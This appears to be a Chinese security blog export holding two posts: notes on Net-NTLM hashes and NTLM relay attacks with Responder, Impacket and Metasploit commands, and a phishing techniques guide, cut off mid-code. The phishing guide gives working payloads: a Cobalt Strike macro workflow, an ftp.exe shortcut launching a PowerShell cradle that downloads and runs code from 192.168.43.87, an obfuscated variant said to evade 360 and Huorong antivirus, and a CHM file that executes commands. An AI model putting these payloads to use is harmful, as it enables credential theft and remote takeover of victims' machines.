<h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><p>Net-NTLM Hash 与 NTLM Hash 不一样。NTLM 认证的第三步中，客户端收到服务端返回的 TYPE 2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 <code>Challenge</code>，用缓存的服务器端密码的 NTLM-Hash 对其进行加密，并与用户名、Challenge 等一起组合得到 Net-NTLM Hash，最后将 Net NTLM Hash封装到 TYPE 3 Authenticate消息中，发往服务端。<br>也就是说 Net-NTLM Hash 是网络环境下 NTLM 认证的散列值。NTLM v1 响应和 NTLM v2 响应对应的就是 Net-NTLM Hash 分为 <code>Net-NTLM Hash v1</code> 和 <code>Net-NTLM Hash v2</code>。<br>NTLM 有 <code>NTLMv1</code> 、<code>NTLMv2</code> 、<code>NTLMsession v2</code> 三个版本，目前使用最多的是NTLMv2版本。</p>
<p>在Type3中的响应，有六种类型，这六种的加密流程都是一样的，区别在于Challenge和加密算法。</p>
<ul>
<li>LM响应（LAN Manager）由大多较早的客户端发送（“原始”响应类型）</li>
<li>NTLM v1响应  基于NT客户端发送的，包括Windows 2000和 XP</li>
<li>NTLM v2响应  在Windows NTService Pack4 中引入一种较新的响应类型，他替换启用了NTLM版本2的系统上的NTLM响应</li>
<li>LM v2响应  替代NTLM版本2系统上的LM响应</li>
<li>NTLM2会话响应(NTLM Mession v2) 用于在没有NTLMv2身份验证的情况下协商NTLM2会话、安全性时，此方案会更改LM NTLM 响应的语义</li>
<li>匿名响应  当匿名上下午正在建立时使用，没有提供实际的证书，也没有真正的身份验证。</li>
</ul>
<p>下面侧重讲<code>NTLM v1</code>响应 和 <code>NTLM v2</code>响应：</p>
<ul>
<li>v1是8位的<code>challenge</code>，v2是16位的<code>challenge</code></li>
<li>v1加密算法：将16位字节的NTLM Hash填空位21个字节，然后分成3组，每组7个字节，所以<code>3DES</code> 加密算法的三组密钥，加密Server发送过来的<code>challenge</code> 。将这三个密文值连接起来得到<code>response</code></li>
<li>v2加密算法：</li>
<li>将Unicode后的大写用户名和Unicode后的身份验证目标拼接在一起。用户名转换为大写么人身份验证目标区分大小写，并且必须与 TargetName 字符按中显示的大小写匹配。将16字节NTLMHash作为密钥，得到一个值。<ul>
<li>构建一个<code>blob</code>信息<ul>
<li>![679c9723c13d91a1d4a8329cbf0b40f2.png]</li>
</ul>
</li>
<li> 使用16字节的NTLM v2 HAsh作为密钥，将HMAC-MD5消息认证代码算法 加密一个值。得到一个16字节的NTProofStr.</li>
<li>将 NTProofStr 与 Blob 拼接起来得到 <code>response</code><br> 对与选择哪个版本的响应是由<code>LmCompatibilityLevel</code>决定的。</li>
</ul>
</li>
</ul>
<p>Challenge/Response验证机制zhongtype3 response里面包含Net-ntlm hash，NTLM v1响应和NTLMv2响应对应的就是Net-ntlm hash分为<code>Net-ntlm hash v1</code>和<code>Net-ntlm hash v2</code>。</p>
<p>Net-NTLM Hash v1的格式为：</p>
<p><code>username::hostname:LM response:NTLM response:challenge</code></p>
<p>Net-NTLM Hash v2的格式为：</p>
<p><code>username::domain:challenge:HMAC-MD5:blob</code></p>
<h4 id="NTLM-v1-amp-NTLM-v2-异同点"><a href="#NTLM-v1-amp-NTLM-v2-异同点" class="headerlink" title="NTLM v1&amp; NTLM v2 异同点"></a>NTLM v1&amp; NTLM v2 异同点</h4><p>NTLM v1 与 NTLM v2 最显著的区别就是 <code>challenge</code>与加密算法不同，相同点为进行加密时都用了用户的NTLM Hash。不同点主要为：</p>
<ul>
<li>Challenge：</li>
<li>Net-NTLM Hash： NTLM v1主要加密算法为DES， NTLM v2主要加密算法为 HMAC-MD5</li>
</ul>
<p>Net-NTLM Hash 不能像 NTLM Hash 一样被攻击者用来进行哈希传递，但是攻击者可以使用各种方法截获客户端与 Server 认证过程中的 Net-NTLM Hash，然后对其进行明文爆破，或者直接用来进行 NTLM 中继攻击。</p>
<hr>
<h3 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP&amp; SSPI"></a>SSP&amp; SSPI</h3><h4 id="SSPI（Security-Support-Provider-Interface）"><a href="#SSPI（Security-Support-Provider-Interface）" class="headerlink" title="SSPI（Security Support Provider Interface）"></a>SSPI（Security Support Provider Interface）</h4><p>SSPI（Security Support Provider Interface） 安全支持提供者接口， 是 Windows 操作系统中用于执行各种安全相关操作（如身份验证）的一个Win32 API。</p>
<h4 id="SSP（Security-Support-Provider）"><a href="#SSP（Security-Support-Provider）" class="headerlink" title="SSP（Security Support Provider）"></a>SSP（Security Support Provider）</h4><p><code>Windows 身份验证协议</code><br>Microsoft 安全支持提供程序接口 (SSPI) 是 Windows 身份验证的基础。 要求身份验证的应用程序和基础结构服务会使用 SSPI ，使用的协议就是以下 <code>SSP</code> 安全协议。</p>
<ul>
<li>  NTLM SSP((msv1_0.dll))</li>
<li>  为Windows 2000之前的客户端-服务器域和非域身份验证（SMB/CIFS）提供NTLM质询/响应身份验证。</li>
<li>  Kerberos(kerberos.dll)</li>
<li>  Windows 2000及更高版本中首选的客户端-服务器域相互身份验证。</li>
<li>  Cred SSP(credssp.dll)</li>
<li>  为远程桌面连接提供单点登录（SSO）和网络级身份验证。</li>
<li>  Digest SSP</li>
<li>  Negotiate SSP(secur32.dll)</li>
<li>  选择Kerberos，如果不可用则选择NTLM协议。协商SSP提供单点登录能力，有时称为集成Windows身份验证</li>
<li>  Schannel SSP(Schannel.dll)</li>
<li>  Windows 2000中引入，Windows Vista中更新为支持更强的<code>AES</code>加密和<code>ECC</code>该提供者使用SSL/TLS记录来加密数据有效载荷。</li>
<li>  Negotiate Extensions SSP</li>
<li>  PKU2U SSP(pku2u.dll)</li>
<li>  在不隶属域的系统之间提供使用数字证书的对等身份验证。</li>
<li>  摘要SSP(wdigest.dll)</li>
<li>  在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询/响应.</li>
</ul>
<h4 id="SSP和SSPI如何工作"><a href="#SSP和SSPI如何工作" class="headerlink" title="SSP和SSPI如何工作"></a>SSP和SSPI如何工作</h4><h3 id="NTLM-SSP原理（NTLM身份验证协议）"><a href="#NTLM-SSP原理（NTLM身份验证协议）" class="headerlink" title="NTLM SSP原理（NTLM身份验证协议）"></a>NTLM SSP原理（NTLM身份验证协议）</h3><p><a href="https://tttang.com/archive/1560/#toc_ntlm-ssp-ntlm">https://tttang.com/archive/1560/#toc_ntlm-ssp-ntlm</a></p>
<hr>
<h3 id="NTLM-Relay-中继攻击原理"><a href="#NTLM-Relay-中继攻击原理" class="headerlink" title="NTLM Relay 中继攻击原理"></a>NTLM Relay 中继攻击原理</h3><p>NTLM Hash 分为 <code>NTLM v1</code> <code>NTLM v2</code> <code>NTLM Session v2</code> 三种，NTLMv2安全性要比NTLMv1 高一些。<br>如果获得的是 NTLM v1，就可以直接进行爆破；如果遇到的是NTLM v2，那么就可以尝试使用NTLM Relay攻击。<br>在NTLM Relay中，我们需要截获 Net-NTLM Hash重放进行攻击（<code>NTLM Relay</code>），从而实现对其他机器的控制控制。<br>对于工作组的机器来说，两台机器的密码需要一致才能成功，对于域用户来说，被欺骗用户（发起请求的用户）需要域管理员组里边的用户才可以，NTLM 中继成功后的权限为被欺骗用户的权限。</p>
<p><img src="/posts/5f88ecbb/e4f7bb4f05390ef9f5b25b3a618fd483.jpg"></p>
<p>简单来说，实现Relay攻击需要两个步骤: </p>
<ul>
<li>1.获取Net-NTLM Hash</li>
<li>2.重放攻击</li>
</ul>
<hr>
<h3 id="获取Net-NTLM-Hash的思路"><a href="#获取Net-NTLM-Hash的思路" class="headerlink" title="获取Net-NTLM Hash的思路"></a>获取Net-NTLM Hash的思路</h3><p>思路是让受害者把Net-NTLM hash发送给攻击者，也就是说只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试用来向攻击者发送Net-NTLMhash。以下为几种常见的获取方法如下：</p>
<ul>
<li>1.网络协议的欺骗与劫持</li>
<li>2.钓鱼攻击</li>
<li>3.与其他漏洞结合</li>
</ul>
<p><img src="/posts/5f88ecbb/a31218ac95efc4806cedd4f74efb4001.png"></p>
<p>微软的NTLM SSP（NTLM Security Support Provider）为NTLM认证的实现提供了基本功能，是Windows SSPI（Security Support Provider Interface ）的一种具体实现。NTLMSSP只是实现了NTLM认证,并没有规定使用什么协议来进行传输。实际上SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，也就是说我们可以通过这些协议来进行攻击。<br>需要注意的是，上述过程中，用户密码的hash被称为LMhash或NThash（Windows Vista/Windowsserver 2008以后LMhash被弃用），即所谓的NTLMhash。而这类hash可以用来进行<code>pass the hash</code>攻击，并不能用来<code>relay attack</code>。这里介绍的<code>relay attack</code>严格意义上讲是用于网络认证的<code>Net-NTLM hash</code>的relay，<code>Net-NTLM hash</code>是由NTLM认证过程中服务端返回的<code>challenge</code>和客户端的<code>response</code>组成的。所以严格的讲，应该是Net-NTLM hash relay atack。<br>如果你自己写一个利用 NTLM SSP 的程序，那么在拿到 NTLM 消息后，你可以以任何你喜欢的方式将这些消息发送至服务端。比如通过 HTTP，TCP，或者任何其他类型的 7 层协议，或者你自己定义的协议。</p>
<p>前面说过了 NTLM SSP 的 TYPE 1/2/3 三条消息。这三条消息本质上就是一组字节。在前面的描述中，说到“客户端在生成 TYPE 1 消息后，会将此消息发送到服务端”。那么客户端通过什么样的方式将此消息发送给服务端呢？ NTLM 本身并没有定义应该用什么方式来发送，它只负责生成 TYPE 1/2/3 这 3 条消息。  </p>
<p>意思就是：NTLM 并没有定义它所依赖的传输层协议。NTLM 消息的传输完全依赖于使用 NTLM 的上层协议来决定。所以说 NTLM 是一个嵌入式协议。<br>NTLM 的上层协议基本可以是任何协议（如果上层是基于UDP 的协议的话，可能会不一样），所以这引出了跨协议的 NTLM-Relay 技巧。无论 NTLM 的上层协议是什么，其携带的 NTLM 的三条消息都是由 NTLM SSP 生成的，所以上层协议在 relay 的过程中，是可以被替换掉的。比如从 http relay 至 smb，从 smb relay 至 ldap/mssql 等等。我们只需要将一个协议中的 NTLM 消息取出来，然后原样不动的地放入另一个协议，就完成了上层协议转换的过程。</p>
<p><strong>SMB-Relay 与 NTLM-Relay</strong></p>
<p>SMB-Relay 与 NTLM-Relay，这两种说法大家都见过，那么哪种才是正确的？</p>
<p>在理解了前面所说的 “NTLM 是嵌入式协议”的说法后，大家应该能够明白：<br>SMB-Relay 指的是 NTLM 上层协议是 SMB 的情况。如果上层协议是 HTTP，也许你可以管它叫做 HTTP-Relay。无论上层协议是什么，都可以统称为 NTLM-Relay。</p>
<h4 id="获取Net-NTLM-Hash工具介绍"><a href="#获取Net-NTLM-Hash工具介绍" class="headerlink" title="获取Net-NTLM Hash工具介绍"></a>获取Net-NTLM Hash工具介绍</h4><blockquote>
<p>Responder(python编写)<br>下载地址：<a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a><br>Inveigh(powershell编写)<br>下载地址：<a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
</blockquote>
<p>参考 <a href="https://blog.csdn.net/qq_41874930/article/details/108825010#11responderinveigh_41">https://blog.csdn.net/qq_41874930/article/details/108825010#11responderinveigh_41</a></p>
<h5 id="responder"><a href="#responder" class="headerlink" title="responder"></a>responder</h5><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<h5 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h5><p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<h4 id="1-LLMNR-NBNS欺骗"><a href="#1-LLMNR-NBNS欺骗" class="headerlink" title="1.  LLMNR/NBNS欺骗"></a>1.  <strong>LLMNR/NBNS欺骗</strong></h4><p>在Windows系统名称解析顺序为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地hosts文件（%windir%\System32\drivers\etc\hosts）</span><br><span class="line"></span><br><span class="line">DNS缓存/DNS服务器</span><br><span class="line"></span><br><span class="line">链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS)</span><br></pre></td></tr></table></figure>

<p>也就是说如果前两种方法名称解析失败后，Windows系统就会通过第三种方法进行名称解析，也就可以使用这两种协议（LLMNR协议、NBNS协议）进行欺骗。先简单看下什么是LLMNR 和 NetBios。</p>
<p><code>LLMNR</code>全称链路本地多播名称解析，是基于域名系统（<code>DNS</code>）数据包格式的协议，<code>IPv4</code>和<code>IPv6</code>的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。</p>
<p><code>NetBios</code>全称网络基本输入输出系统，它提供了<code>OSI</code>模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。<code>NetBIOS</code>也是计算机的标识名称，主要用于局域网内计算机的互访。<code>NetBIOS</code>的工作流程就是正常的机器名解析查询应答过程。在<code>Windows</code>操作系统中，默认情况下在安装<code>TCP/IP</code>协议后会自动安装<code>NetBIOS</code>。</p>
<p>在局域网环境下，当用户输入了一个不存在、或者错误的的主机名，或者是在DNS种不存在的主机名时，Windows就会通过利用LLMNR和 NetBIOS名称服务进行查找，最终在局域网内广播LLMNR/NBNS数据包来请求解析主机名。<br>而此时我们在局域网内有一台主机权限（攻击机），就可以伪装成受害主机想要访问的机器，从而让受害主机交出相应的登陆凭证。攻击机在此过程中主要是当作一个中间人，去截获客户端的Net-NTLM Hash。</p>
<h5 id="使用Responder在局域网下开启监听，等待局域网内广播的数据报。"><a href="#使用Responder在局域网下开启监听，等待局域网内广播的数据报。" class="headerlink" title="使用Responder在局域网下开启监听，等待局域网内广播的数据报。"></a>使用Responder在局域网下开启监听，等待局域网内广播的数据报。</h5><p><code>responder -l eht0 -f -v</code></p>
<p>假装这里是测试图![假装有图片]</p>
<p>然后再域控主机上利用SMB协议随便访问一个不存在的主机  <code>dir \\ip\c$</code> 之后监听主机就会接收到返回过来的Net-NTLM Hash值。</p>
<h4 id="2-WPAD劫持"><a href="#2-WPAD劫持" class="headerlink" title="2.WPAD劫持"></a>2.<strong>WPAD劫持</strong></h4><p>WPAD(Web Proxy Auto-Discovery Protocol) 是用来查找PAC文件的协议，其主要通过DHCP、DNS、LLMNR、NBNS协议来查找存放PAC文件的主机。WPAD通过让浏览器<strong>自动发现代理服务器</strong>，查找存放PAC 文件的主机来定位代理配置文件，下载编译并运行，最终自动使用代理访问网络。</p>
<p>用户在访问网页时，首先会查询PAC文件的位置，然后获取PAC文件，将PAC文件作为代理配置文件。<br>查询PAC文件的顺序如下 ：</p>
<ul>
<li>1.通过DHCP服务器</li>
<li>2.查询WPAD主机的IP</li>
<li>Hosts<ul>
<li>DNS(cache/server)</li>
<li>LLMNR</li>
<li>NBNS</li>
</ul>
</li>
</ul>
<p>劫持<code>WPAD</code>一般有两种方式，一种是利用<code>LLMNR/NBNS</code>投毒，另外一种是利用<code>ipv6</code>协议，使用<code>DHCPv6</code>进行劫持。</p>
<h5 id="配合LLMNR-NBNS投毒"><a href="#配合LLMNR-NBNS投毒" class="headerlink" title="配合LLMNR/NBNS投毒"></a>配合LLMNR/NBNS投毒</h5><p>一个典型的劫持方式是利用LLMNR/NBNS欺骗来让受害者从攻击者获取PAC文件，PAC文件指定攻击者就是代理服务器，然后攻击者就可以劫持受害者的HTTP流量，在其中插入任意HTML标签，从而获得用户的Net-NTLM Hash。</p>
<p>当浏览器设置为 “自动检测代理设置” 后，它就会下载攻击者事先准备好的wpad.dat文件，这样一来，客户端的流量就会经过攻击者的机器。<br>![20220426150817.png]</p>
<p>使用 <code>Responder</code>创建一个假的WPAD服务器，并响应客户端的WPAD名称解析。然后客户端请求这个假的WPAD服务器种的wpad.dat文件。<br><code>responder -l eth0 -r on -v -F on -w on</code></p>
<p>![假装有图]</p>
<h5 id="配合DHCPv6"><a href="#配合DHCPv6" class="headerlink" title="配合DHCPv6"></a>配合DHCPv6</h5><h3 id="SMB中继攻击"><a href="#SMB中继攻击" class="headerlink" title="SMB中继攻击"></a>SMB中继攻击</h3><p> <a href="https://redhatzone.com/ask/article/1459.html">https://redhatzone.com/ask/article/1459.html</a></p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p><img src="/posts/5f88ecbb/1ccf1452409707b29dcce54f0c62810d.jpg"></p>
<h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><p>dc winsercer 2012<br>域内机器 winserver 2008 出网    kali  frp连进来<br>参考 <a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md</a></p>
<h5 id="Responder中的MultiRelayx-py"><a href="#Responder中的MultiRelayx-py" class="headerlink" title="Responder中的MultiRelayx.py"></a>Responder中的MultiRelayx.py</h5><p>利用 MultiRelay.py 攻击，获得目标主机的 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 MultiRelay.py -t &lt;被攻击ip&gt; -u ALL</span><br></pre></td></tr></table></figure>


<h5 id="Impacket中的smbrelayx-py"><a href="#Impacket中的smbrelayx-py" class="headerlink" title="Impacket中的smbrelayx.py"></a>Impacket中的smbrelayx.py</h5><p><code>impacket-smbrelayx -h &lt;被攻击ip&gt; -c whoami</code></p>
<p>图片</p>
<p>让任意主机访问这个攻击者精心构造好的 SMB 服务器：</p>
<p><code>net use \\&lt;kali IP&gt;</code></p>
<h5 id="Impcaket中的ntlmrelayx-py"><a href="#Impcaket中的ntlmrelayx-py" class="headerlink" title="Impcaket中的ntlmrelayx.py"></a>Impcaket中的ntlmrelayx.py</h5><p>ntlmrelayx 脚本可以直接用现有的 hash 去尝试重放指定的机器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t smb://&lt;被攻击ip&gt; -c whoami -smb2support</span><br></pre></td></tr></table></figure>

<h5 id="Metasploit中的smb-relay模块（ms08-068）"><a href="#Metasploit中的smb-relay模块（ms08-068）" class="headerlink" title="Metasploit中的smb_relay模块（ms08-068）"></a>Metasploit中的smb_relay模块（ms08-068）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>在目标的 cmd 中执行 <code>net use \\&lt;kali ip&gt;\c$</code> 来访问攻击者搭建的恶意 smb 服务</p>
<hr>
<h3 id="LDAP中继攻击"><a href="#LDAP中继攻击" class="headerlink" title="LDAP中继攻击"></a>LDAP中继攻击</h3><h3 id="Exchange中继攻击"><a href="#Exchange中继攻击" class="headerlink" title="Exchange中继攻击"></a>Exchange中继攻击</h3><h3 id="中继攻击防御措施"><a href="#中继攻击防御措施" class="headerlink" title="中继攻击防御措施"></a>中继攻击防御措施</h3><p>1.SMB中继为滥用NTLM身份验证协议，所以干脆利落，完全禁用NTLM，切换到相对安全的 Kerberos，当然缺点也很明显，相对旧的操作系统不支持Kerberos身份验证。</p>
<p>2.启用SMB签名，SMB签名将通过对所有流量进行签名来防止中继到SMB，由于签名需要用户密码来验证消息，而攻击者没有受害者的密码，因此中继攻击者无法发送服务器将接收的任何流量，相对更安全。</p>
<hr>
<h3 id="NTLM反射"><a href="#NTLM反射" class="headerlink" title="NTLM反射"></a>NTLM反射</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><hr>
<h3 id="Potato家族分析"><a href="#Potato家族分析" class="headerlink" title="Potato家族分析"></a>Potato家族分析</h3><h4 id="Origin-Potato-MS08-068"><a href="#Origin-Potato-MS08-068" class="headerlink" title="Origin Potato_MS08-068"></a>Origin Potato_MS08-068</h4><h4 id="CVE-2019-1384-Ghost-potato"><a href="#CVE-2019-1384-Ghost-potato" class="headerlink" title="CVE-2019-1384_Ghost potato"></a>CVE-2019-1384_Ghost potato</h4><hr>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://xz.aliyun.com/t/1943">https://xz.aliyun.com/t/1943</a><br><a href="https://www.xiinnn.com/article/90eaacf3.html">https://www.xiinnn.com/article/90eaacf3.html</a><br><a href="https://juejin.cn/post/6952793401460949029">https://juejin.cn/post/6952793401460949029</a><br><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#0x03-net-ntlm-hash</a><br><a href="http://davenport.sourceforge.net/ntlm.html">http://davenport.sourceforge.net/ntlm.html</a><br><a href="https://zhuanlan.zhihu.com/p/372961591">https://zhuanlan.zhihu.com/p/372961591</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108825010">https://blog.csdn.net/qq_41874930/article/details/108825010</a><br><a href="https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA">https://mp.weixin.qq.com/s/aemG5XwVdyzNbOBXztDUbA</a><br><a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/NTLM%E4%B8%AD%E7%BB%A7.md</a><br><a href="https://hetian.blog.csdn.net/article/details/106330021">https://hetian.blog.csdn.net/article/details/106330021</a><br><a href="https://www.freebuf.com/articles/network/244375.html">https://www.freebuf.com/articles/network/244375.html</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108825010#SSPI_26">https://blog.csdn.net/qq_41874930/article/details/108825010#SSPI_26</a><br><a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/Responder%E6%AC%BA%E9%AA%97.md">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/OS%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/Responder%E6%AC%BA%E9%AA%97.md</a><br><a href="https://redhatzone.com/ask/article/1459.html">https://redhatzone.com/ask/article/1459.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>NTLM</category>
      </categories>
      <tags>
        <tag>NTLM</tag>
      </tags>
  </entry>
  <entry>
    <title>常见钓鱼思路总结</title>
    <url>/posts/7057a17a/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文只记载一下钓鱼用到的几种思路，具体免杀先暂不考虑</p>
<br>

<h3 id="word宏钓鱼"><a href="#word宏钓鱼" class="headerlink" title="word宏钓鱼"></a>word宏钓鱼</h3><p>创建一个listner</p>
<p><img src="/posts/7057a17a/1.png" alt="截图"></p>
<p>选择 Attacks -&gt; MS Office Macro 选择刚才创建的listener -&gt; Generate</p>
<p>然后选择 Copy Macro</p>
<p><img src="/posts/7057a17a/2.png" alt="截图"></p>
<br>

<p>打开word 点击选项-&gt;开发攻击  打勾</p>
<p><img src="/posts/7057a17a/3.png" alt="截图"></p>
<p>保存后新建一个word文件  选择开发工具，然后打开 Visual Basic</p>
<p><img src="/posts/7057a17a/4.png" alt="截图"></p>
<p><img src="/posts/7057a17a/5.png" alt="截图"></p>
<p>Ctrl +S 保存</p>
<p><img src="/posts/7057a17a/6.png" alt="截图"></p>
<p>然后会弹框 选择 是</p>
<p><img src="/posts/7057a17a/7.png" alt="截图"></p>
<p>然后保存退出 再打开时选择启用 就会上线到CS</p>
<br>

<br>

<h3 id="Link链接钓鱼"><a href="#Link链接钓鱼" class="headerlink" title="Link链接钓鱼"></a>Link链接钓鱼</h3><p>ftp 加 ！可以执行命令</p>
<p><img src="/posts/7057a17a/8.png" alt="截图"></p>
<br>

<p>首先先创建一个ftp的快捷方式，然后新建一个文件名aaa.dll，然后通过aaa.dll去调用bbb.ps1 然后上线</p>
<p>快捷方式的起始位置留空，目标为<code>C:\Windows\System32\ftp.exe -&quot;&quot;s:aaa.dll</code></p>
<p><img src="/posts/7057a17a/9.png" alt="截图"></p>
<br>

<p>在CS中选择 Attack -&gt; Scripted Wed Delivery(s)</p>
<p><img src="/posts/7057a17a/10.png" alt="截图"></p>
<br>

<p><img src="/posts/7057a17a/11.png" alt="截图"></p>
<br>

<p><img src="/posts/7057a17a/12.png" alt="截图"></p>
<p>aaa.dll</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!cmd /k powershell -exec bypass .\bbb.ps1</span><br></pre></td></tr></table></figure>

<p>bbb.ps1(直接第三方调用powershell加参会被360等拦截，采用无参调用)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.43.87:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>

<p>简单混淆下 就可以过360和火绒 但是运行后会有一个黑框，选择为最小化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ds=&quot;Down&quot;+&quot;loadString&quot;;</span><br><span class="line">Invoke-Expression (New-Object Net.WebClient).$ds.Invoke(&#x27;h&#x27;+&#x27;ttp://192.168.43.87:80/a&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/7057a17a/13.png" alt="截图"></p>
<br>

<h3 id="Link快捷方式钓鱼"><a href="#Link快捷方式钓鱼" class="headerlink" title="Link快捷方式钓鱼"></a>Link快捷方式钓鱼</h3><br>

<br>

<h3 id="CHM文档钓鱼"><a href="#CHM文档钓鱼" class="headerlink" title="CHM文档钓鱼"></a>CHM文档钓鱼</h3><p>使用 EasyCHM 可以轻松的新建一个 chm 文件，首先新建一个文件夹，然后在文件夹中新建一个 html 文件，html 代码如下。可以利用js（jscript）调用com控件执行命令</p>
<p>1.创建一个名为chm的文件夹 然后创建一个1.html 代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span> //payload前面要加一个英文版的逗号 , 否则打开chm文档时会出错</span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>使用easychm创建一个chm文档  新建工程</p>
<br>

<p><img src="/posts/7057a17a/14.png" alt="截图"></p>
<p>进行编译 生成CHM</p>
<p><img src="/posts/7057a17a/15.png" alt="截图"></p>
<p>然后得到一个chm.CHM</p>
<p><img src="/posts/7057a17a/16.png" alt="截图"></p>
<p>双击运行 便会弹出之前测试的calc</p>
<p><img src="/posts/7057a17a/17.png" alt="截图"></p>
<br>

<p>可以使用同样的方式去上线到CS上  替换1.html中 payload处的代码即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span 